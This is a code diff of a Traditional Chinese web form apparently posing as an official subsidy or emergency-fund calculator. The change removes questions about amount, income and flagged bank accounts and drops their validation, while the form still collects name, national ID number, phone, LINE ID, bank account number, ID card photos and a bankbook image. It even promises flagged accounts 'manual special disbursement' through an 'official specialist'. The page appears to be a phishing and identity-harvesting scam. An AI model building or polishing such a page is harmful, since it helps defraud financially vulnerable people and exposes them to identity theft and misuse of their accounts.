@@ -941,67 +941,11 @@
             <div class="step-progress" aria-hidden="true"><span></span></div>
           </div>
 
-          <div class="question-block">
-            <label class="form-label"><span class="question-num">1</span>您目前最需要試算的周轉/補助金額？ <span class="required">*</span></label>
-            <div class="option-grid">
-              <button type="button" onclick="selectAmount(this, '50000-100000')" class="option-btn" data-amount>
-                <span class="option-title">NT$ 50,000 至 100,000</span>
-                <span class="option-sub">短期生活支出補助</span>
-              </button>
-              <button type="button" onclick="selectAmount(this, '100000-200000')" class="option-btn" data-amount>
-                <span class="option-title">NT$ 100,000 至 200,000</span>
-                <span class="option-sub">家庭支出與醫療補助</span>
-              </button>
-              <button type="button" onclick="selectAmount(this, '200000-300000')" class="option-btn" data-amount>
-                <span class="option-title">NT$ 200,000 至 300,000</span>
-                <span class="option-sub">多項支出合併申請</span>
-              </button>
-              <button type="button" onclick="selectAmount(this, '300000+')" class="option-btn" data-amount>
-                <span class="option-title">NT$ 300,000 以上</span>
-                <span class="option-sub">特殊情況專人確認</span>
-              </button>
-            </div>
-          </div>
+          
 
-          <div class="question-block">
-            <label class="form-label"><span class="question-num">2</span>您目前的每月收入狀況區間？ <span class="required">*</span></label>
-            <div class="option-grid compact">
-              <button type="button" onclick="selectEmployment(this, '0-25000')" class="option-btn" data-employment>
-                <span class="option-title">NT$ 0 至 25,000</span>
-                <span class="option-sub">低收入或工作不穩定</span>
-              </button>
-              <button type="button" onclick="selectEmployment(this, '25000-40000')" class="option-btn" data-employment>
-                <span class="option-title">NT$ 25,000 至 40,000</span>
-                <span class="option-sub">基礎薪資/自營接案</span>
-              </button>
-              <button type="button" onclick="selectEmployment(this, '40000-60000')" class="option-btn" data-employment>
-                <span class="option-title">NT$ 40,000 至 60,000</span>
-                <span class="option-sub">穩定工作收入</span>
-              </button>
-              <button type="button" onclick="selectEmployment(this, '60000+')" class="option-btn" data-employment>
-                <span class="option-title">NT$ 60,000 以上</span>
-                <span class="option-sub">高收入但仍需高額度</span>
-              </button>
-            </div>
-          </div>
+          
 
-          <div class="question-block">
-            <label class="form-label"><span class="question-num">3</span>您目前的銀行帳戶狀態是否正常？ <span class="required">*</span></label>
-            <div class="option-grid compact">
-              <button type="button" onclick="selectBankStatus(this, 'no')" class="option-btn" data-bank>
-                <span class="option-title">是，正常</span>
-                <span class="option-sub">目前非銀行警示戶</span>
-              </button>
-              <button type="button" onclick="selectBankStatus(this, 'resolved')" class="option-btn" data-bank>
-                <span class="option-title">曾經是</span>
-                <span class="option-sub">目前已處理或解除</span>
-              </button>
-              <button type="button" onclick="selectBankStatus(this, 'yes')" class="option-btn" data-bank>
-                <span class="option-title">否，是警示戶</span>
-                <span class="option-sub">屬於銀行警示帳戶</span>
-              </button>
-            </div>
-          </div>
+          
 
           <div id="disqualify-alert" class="alert alert-warning hidden">
             ⚠️ 很抱歉，警示戶暫不符合線上自動出款資格。建議點擊下一步填寫完整資料，由官方專員為您爭取人工特殊出款通道。
@@ -1372,10 +1316,7 @@
       var lineId = document.getElementById('lineId').value.trim();
       var bankAccount = document.getElementById('bankAccount').value.trim();
 
-      if (!formData.amount || !formData.employment || !formData.bankStatus) {
-        alert('請先完成補助需求、收入與銀行帳戶狀態');
-        return;
-      }
+      
 
       if (!fullName || !idNumber || !phone || !lineId || !bankAccount || !formData.idFront || !formData.idBack || !formData.bankBook) {
         alert('請完整填寫實名制欄位並上傳身分證正反面與存摺圖片');
